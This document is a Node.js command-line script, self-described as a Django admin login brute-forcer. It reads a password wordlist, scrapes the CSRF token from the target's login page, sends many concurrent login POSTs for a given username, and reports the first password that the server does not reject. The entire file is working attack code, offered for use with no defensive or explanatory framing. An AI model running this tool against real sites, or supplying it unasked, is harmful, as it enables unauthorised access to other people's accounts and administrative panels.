#! /usr/bin/env node

// Module Dependencies
var request  = require('request');
var fs       = require('fs');
var readline = require('readline');
var stream   = require('stream');
var es       = require('event-stream');
var async    = require('async');

// Usage message
if (process.argv.length !== 6) {
  console.log(
    'NodeJS Django Admin Login Bruteforce 1.0\n' +
    'Usage: ./djangoAdmin.js <username> <wordlist> <target url> <max concurrent requests>' 
  );

  process.exit();
}

// Set user, filepath, url from CLI args
var USERNAME    = process.argv[2];
var FILEPATH    = process.argv[3];
var BASE_URL    = process.argv[4];
var CONCURRENCY = process.argv[5];

// Set regexp to define CSRF and login errors
var CSRF    = /<input type='hidden' name='csrfmiddlewaretoken' value='(.*)' \/>/;
var ERROR_1 = /Please enter the correct username/ ;
var ERROR_2 = /Please correct the error below/;

// Configure the CSRF token request
var csrfOptions = {
  port: 8000,
  url: BASE_URL,
  method: 'GET',
  headers: {}
};

// Define function to extract CSRF token
var getCSRF = function(callback) {
  request(csrfOptions, function (error, response, body) {
    if (!error && response.statusCode == 200) {
      callback(body.match(CSRF)[1]);
    }
  });
};

// Configure the login request
var loginOptions = function(password, csrfToken) {
  return {
    port: 8000,
    url: BASE_URL + '/login/',
    method: 'POST',
    headers: { 
      Referer: BASE_URL,
      Cookie: 'csrftoken=' + csrfToken 
    },
    form: {
      csrfmiddlewaretoken: csrfToken,
      username: USERNAME,
      password: password,
      next: '/admin/'
    }
  };
};

var tryLogin = function(password, callback) {

  getCSRF(function(token) {
    var opt = loginOptions(password, token);

    // Send a login POST
    request(opt, function (error, response, body) {

      if (!error) { 
        // If we match known regex password is incorrect
        if ( response.statusCode === 200 && (body.match(ERROR_1) || body.match(ERROR_2))) {
          console.log('[-] Invalid: ' + password);
        } else if (response.statusCode < 500) {
          console.log(
            '[+] FOUND: ' + password  +
            '\n[+] Shutting down....' 
          );

          process.exit();
        } else {
          console.log('[-] Server responded with: ' + response.statusCode);
        }
      }
      
      callback && callback();
    });
  });
}

// =====================================================================
//  MAIN ===============================================================
// =====================================================================

console.log('[+] Starting bruteforce...')

var queue = async.queue(tryLogin, CONCURRENCY);

queue.drain = function() {
  console.log('[+] Finished');
};

console.log('[+] Reading wordlist...')

fs.createReadStream(FILEPATH)
  .pipe(es.split())
  .pipe(es.map(function(word) {
    queue.push(word);
  })
  .on('error', function() {
    console.log('[-] Error reading file');
  })
  .on('end', function() {
    console.log('[+] Full wordlist read');
  })
);
